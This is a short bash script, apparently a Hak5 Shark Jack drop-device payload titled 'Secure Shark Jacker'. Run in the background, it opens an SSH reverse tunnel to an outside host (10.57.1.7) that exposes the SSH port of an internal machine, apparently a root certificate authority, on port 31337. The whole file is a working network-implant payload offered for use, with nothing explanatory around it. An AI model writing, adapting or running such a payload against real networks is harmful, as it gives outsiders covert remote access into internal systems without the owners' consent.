#!/bin/bash
#
# Title:         Secure Shark Jacker
# Author:        Mr. Robot
# Version:       13.37
#
INTERNAL_HOST=rootca.digisigner.local
INTERNAL_PORT=22

function run() {
    ssh -R localhost:31337:$INTERNAL_HOST:$INTERNAL_PORT garyhost@10.57.1.7
}


# Run payload
run &
